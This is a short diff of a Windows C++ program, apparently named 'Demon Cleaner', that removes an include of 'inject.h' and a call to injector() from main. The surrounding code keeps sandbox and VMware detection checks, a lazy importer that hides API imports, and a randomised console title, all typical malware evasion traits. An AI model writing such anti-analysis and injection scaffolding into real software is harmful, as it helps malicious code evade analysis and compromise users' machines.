@@ -20,7 +20,7 @@
 #pragma comment(lib, "urlmon.lib")
 #pragma comment(lib,"Wininet.lib") 
 #include "../Demon Cleaner/Headers/lazy_importer.hpp"
-#include "inject.h"
+
 BOOL IsSandboxie()
 {
     if (GetModuleHandle("SbieDll.dll") != NULL)
@@ -74,7 +74,7 @@ BOOL IsVMware()
 int main()
 {
     SetConsoleTitleA(RandomTitle(rand() % 90 + 20).c_str());
-    injector();
+
 
 
     
